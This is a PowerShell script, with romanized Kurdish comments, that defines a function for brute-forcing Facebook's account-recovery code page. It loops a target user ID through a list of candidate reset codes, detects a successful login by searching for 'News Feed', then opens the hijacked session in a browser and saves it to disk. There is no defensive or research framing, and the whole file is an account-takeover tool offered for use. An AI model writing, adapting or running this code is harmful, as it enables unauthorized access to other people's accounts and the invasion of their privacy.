#https://www.facebook.com/recover/code?u=UESR_ID&n=NUMS&exp_locale=ar_AR&s=24&ocl=1
#https://www.facebook.com/recover/code?u=USER__ID&n=NUMS

#Estash function:

function Facebook_Bruteforce{


#drwst krdni Help:

<#

.SYNOPSIS
am function-a bakardet bo hersh lasar kody garawa

.DESCRIPTION
darwazay garan ba dway aw zhmara rastay ka facebook ayat ba hazhmaraka

.EXAMPLE
Facebook_Bruteforce -UserID 38276827346 -NumberList .\nums.txt -Sleep 3

.NOTES
to atwani la kate xawe helakat parametary (Sleep) bakar beny

.LINK
https://www.fb.com/SfD.H4kurd

#>

    #drwstkrni parameter, bo hardu (UserID w Number):

    [CmdletBinding()] param(
        
        # yakam shwen:
        [Parameter(Position = 0, Mandatory = $true)]
        [Alias('ID')]
        [String]
        $UserID,

        #dwam shwen:
        [Parameter(Position = 1, Mandatory = $true)]
        [Alias('Numbers')]
        [String]
        $NumberList,

        # Mandatory = $false wata nachar net ama bnuset
        [Parameter(Position = 2, Mandatory = $false)]
        [Int32]
        $Sleep = 1
    
    )


    $uID = $UserID
    #shweny wordlisty (number list)akan:
    $nums = Get-Content -ErrorAction SilentlyContinue -Path $NumberList


    $baseurl = "https://www.facebook.com/recover/code?u="
    #$userId = "100008461752993"
    $baseurlIn = "&n="
    #$attacknumber = "123456"
    $baseurlEnd = "&exp_locale=ar_AR&s=24&ocl=1"


    :UserIdLoop foreach ($Username in $uID){
        
        # bo har zhmarayak la listaka (var = num) dyare akat wak nrx:
        foreach ($num in $nums){

        # garan la new WEB:
        # nasandny WEB platform (ktebxana):
        $webClient = New-Object Net.WebClient
        #jore wshasazy (UTF8):
        $webClient.Encoding = New-Object System.Text.UTF8Encoding

        #kama browser sardankar bet?: (chorme, ie, edge..htd)
        $webClient.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; rv:11.0) like Gecko";

        #bastnawae bastara parchkrawakan:
        $source = $baseurl + $username + $baseurlIn + $num + $baseurlEnd

        $source
        # hamu agarek file-aka la internetawa download akat:
        $cntt = $webClient.DownloadString($source)

        #agar file-a dabazewaka wshae 'news feed'y tya bu, awa:
        if($cntt | Select-String -SimpleMatch "News Feed"){
            
            $idistrue = $true
            Write-Output "Match Found! $Username | $num"
            
            #nasandny ie w chuna sar browser:
            $wow = New-Object -com internetexplorer.application
            $wow.navigate2("$source")
            $wow.visible = $true


        }else{
            
            $idistrue = $false
            Write-Host -ForegroundColor Gray -BackgroundColor Black "$num doesn't match"

        }

        if ($idistrue -eq $true){
            $cntt | Out-File "D:\founded.html" -Encoding unicode
            break UserIdLoop

        }

          #parameterk bo xata xawakan lakate download krdny file-akan:
        Start-Sleep -Seconds $Sleep


        }

      
    }



}














